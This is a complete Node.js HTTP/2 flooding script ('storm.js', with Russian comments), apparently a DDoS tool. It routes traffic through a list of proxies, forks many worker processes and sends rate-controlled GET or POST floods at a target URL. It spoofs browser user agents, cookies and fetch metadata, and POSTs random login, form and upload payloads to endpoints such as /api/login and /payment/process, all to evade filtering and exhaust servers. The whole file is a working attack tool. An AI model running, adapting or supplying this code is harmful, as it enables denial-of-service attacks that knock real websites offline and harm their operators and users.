const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const crypto = require("crypto");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
  console.log(`node storm.js [target] [time] [rate] [thread] [proxy] [--method=GET/POST]`);
  console.log(`optional: --path --delay=ms --method=POST`);
  process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
  return min + ((Math.random() * (max - min + 1)) | 0);
}

function randomElement(arr) {
  return arr[(Math.random() * arr.length) | 0];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function parseDelay() {
    const delayArg = process.argv.find(arg => arg.startsWith('--delay='));
    if (delayArg) {
        const delayValue = parseInt(delayArg.split('=')[1]);
        return isNaN(delayValue) ? 0 : delayValue;
    }
    return 0;
}

function parseMethod() {
    const methodArg = process.argv.find(arg => arg.startsWith('--method='));
    if (methodArg) {
        return methodArg.split('=')[1].toUpperCase();
    }
    return 'GET';
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    pathFlag: process.argv.includes('--path'),
    delay: parseDelay(),
    method: parseMethod()
};

var proxies = readLines(args.proxyFile);
const parsedTarget = new URL(args.target);

if (cluster.isPrimary) {
    console.log(`[*] Method: ${args.method}`);
    console.log(`[*] Target: ${args.target}`);
    console.log(`[*] Threads: ${args.threads}`);
    console.log(`[*] Rate: ${args.Rate} req/sec`);
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();
const fetch_site = ["none", "same-origin", "same-site", "cross-site"];
const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8"
];

const useragents = [
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/22B91 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPad; CPU OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15"
];

// Реалистичные пути для POST
const postPaths = [
    '/api/login',
    '/api/register',
    '/api/search',
    '/api/submit',
    '/api/update',
    '/api/create',
    '/api/delete',
    '/api/upload',
    '/form/contact',
    '/form/subscribe',
    '/auth/signin',
    '/auth/signup',
    '/user/update',
    '/checkout/process',
    '/payment/process'
];

// Генерация реалистичного JSON payload
function generateJSONPayload(size = 'medium') {
    const payloads = {
        small: {
            username: randomString(8),
            email: `${randomString(6)}@${randomElement(['gmail.com', 'yahoo.com', 'outlook.com'])}`,
            action: randomElement(['login', 'register', 'update'])
        },
        medium: {
            username: randomString(10),
            password: randomString(16),
            email: `${randomString(8)}@${randomElement(['gmail.com', 'yahoo.com', 'hotmail.com'])}`,
            firstName: randomString(6),
            lastName: randomString(8),
            action: randomElement(['register', 'update', 'submit']),
            timestamp: Date.now(),
            sessionId: crypto.randomBytes(16).toString('hex')
        },
        large: {
            user: {
                username: randomString(12),
                password: randomString(20),
                email: `${randomString(10)}@example.com`,
                profile: {
                    firstName: randomString(8),
                    lastName: randomString(10),
                    age: randomIntn(18, 80),
                    country: randomElement(['US', 'GB', 'DE', 'FR', 'ES']),
                    city: randomString(10),
                    address: randomString(30)
                }
            },
            metadata: {
                timestamp: Date.now(),
                sessionId: crypto.randomBytes(16).toString('hex'),
                deviceId: crypto.randomBytes(8).toString('hex'),
                platform: randomElement(['iOS', 'Android', 'Web']),
                version: `${randomIntn(1, 10)}.${randomIntn(0, 9)}.${randomIntn(0, 9)}`
            },
            data: {
                items: Array(randomIntn(5, 15)).fill(null).map(() => ({
                    id: randomIntn(1000, 9999),
                    name: randomString(12),
                    value: randomIntn(1, 1000)
                }))
            }
        }
    };
    
    return JSON.stringify(payloads[size]);
}

// Генерация application/x-www-form-urlencoded payload
function generateFormPayload(size = 'medium') {
    const forms = {
        small: `username=${randomString(8)}&password=${randomString(12)}`,
        medium: `username=${randomString(10)}&password=${randomString(16)}&email=${randomString(8)}@gmail.com&action=login&remember=true&csrf=${randomString(32)}`,
        large: `username=${randomString(12)}&password=${randomString(20)}&email=${randomString(10)}@example.com&firstName=${randomString(8)}&lastName=${randomString(10)}&address=${randomString(30)}&city=${randomString(10)}&country=US&zip=${randomIntn(10000, 99999)}&phone=${randomIntn(1000000000, 9999999999)}&csrf=${randomString(32)}&sessionId=${crypto.randomBytes(16).toString('hex')}&timestamp=${Date.now()}`
    };
    
    return forms[size];
}

// Генерация multipart/form-data payload (имитация загрузки файла)
function generateMultipartPayload() {
    const boundary = `----WebKitFormBoundary${randomString(16)}`;
    const filename = `${randomString(8)}.${randomElement(['jpg', 'png', 'pdf', 'txt', 'doc'])}`;
    const fileContent = randomString(randomIntn(500, 2000)); // Имитация содержимого файла
    
    const parts = [
        `--${boundary}`,
        `Content-Disposition: form-data; name="username"`,
        ``,
        randomString(10),
        `--${boundary}`,
        `Content-Disposition: form-data; name="file"; filename="${filename}"`,
        `Content-Type: application/octet-stream`,
        ``,
        fileContent,
        `--${boundary}--`
    ];
    
    return {
        boundary: boundary,
        data: parts.join('\r\n')
    };
}

function buildHeaders(method = 'GET') {
    let rand_path;
    
    if (method === 'POST') {
        // Для POST используем реалистичные API endpoints
        rand_path = randomElement(postPaths);
        if (args.pathFlag) {
            rand_path += `?session=${crypto.randomBytes(8).toString('hex')}`;
        }
    } else {
        // Для GET стандартная логика
        if (args.pathFlag) {
            const rand_query = `?${randomString(12)}=${randomIntn(100000, 999999)}`;
            rand_path = (parsedTarget.pathname || "/") + rand_query;
        } else {
            rand_path = parsedTarget.pathname || "/";
        }
    }
    
    const userAgent = randomElement(useragents);
    const headers = {
        ":method": method,
        ":scheme": "https",
        ":path": rand_path,
        ":authority": parsedTarget.host
    };
    
    if (method === 'POST') {
        // POST специфичные заголовки
        const contentType = randomElement([
            'application/json',
            'application/x-www-form-urlencoded',
            'multipart/form-data'
        ]);
        
        headers["content-type"] = contentType;
        
        // Для multipart добавляем boundary
        if (contentType === 'multipart/form-data') {
            headers["content-type"] = `multipart/form-data; boundary=----WebKitFormBoundary${randomString(16)}`;
        }
        
        // Origin для POST (CORS)
        headers["origin"] = parsedTarget.origin;
        
        // Referer
        headers["referer"] = `${parsedTarget.origin}/`;
        
        // Cache-Control для POST
        headers["cache-control"] = "no-cache";
    }
    
    headers["sec-fetch-dest"] = method === 'POST' ? "empty" : "document";
    headers["sec-fetch-mode"] = method === 'POST' ? "cors" : "navigate";
    headers["sec-fetch-site"] = "same-origin";
    headers["user-agent"] = userAgent;
    
    if (method === 'GET') {
        headers["upgrade-insecure-requests"] = "1";
    }
    
    headers["accept"] = method === 'POST' 
        ? "application/json, text/plain, */*"
        : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    
    headers["accept-language"] = randomElement(languages);
    headers["accept-encoding"] = "gzip, deflate, br";
    
    // Cookie для аутентификации
    if (Math.random() > 0.3) {
        headers["cookie"] = `session_id=${crypto.randomBytes(16).toString('hex')}; _ga=GA1.2.${randomIntn(100000000, 999999999)}.${Date.now()}`;
    }
    
    return headers;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };
    
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;
        
        connection.setKeepAlive(true, 600000);
        
        const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1'],
            rejectUnauthorized: false,
            socket: connection,
            servername: parsedTarget.host,
            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305",
            sigalgs: "ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512",
            ecdhCurve: 'X25519:prime256v1:secp384r1:secp521r1',
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        };
        
        const tlsConn = tls.connect(tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 4096,
                maxConcurrentStreams: 100,
                initialWindowSize: 2097152,
                maxFrameSize: 16384,
            },
            createConnection: () => tlsConn
        });
        
        client.on("connect", () => {
            if (args.delay > 0) {
                setInterval(() => {
                    sendRequest(client, args.method);
                }, args.delay);
            } else {
                setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        sendRequest(client, args.method);
                    }
                }, 1000);
            }
        });
        
        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });
        
        client.on("error", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

function sendRequest(client, method) {
    const headers = buildHeaders(method);
    
    const request = client.request(headers, {
        parent: randomIntn(100, 9999),
        exclusive: Math.random() > 0.5
    });
    
    // Для POST отправляем body
    if (method === 'POST') {
        let payload;
        const contentType = headers["content-type"];
        
        if (contentType.includes('application/json')) {
            // Рандомный размер payload для вариативности нагрузки
            const size = randomElement(['small', 'medium', 'large']);
            payload = generateJSONPayload(size);
        } else if (contentType.includes('application/x-www-form-urlencoded')) {
            const size = randomElement(['small', 'medium', 'large']);
            payload = generateFormPayload(size);
        } else if (contentType.includes('multipart/form-data')) {
            const multipart = generateMultipartPayload();
            payload = multipart.data;
        }
        
        // Отправляем данные
        if (payload) {
            request.write(payload);
        }
    }
    
    request.on("error", () => {
        request.destroy();
    });
    
    request.end();
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);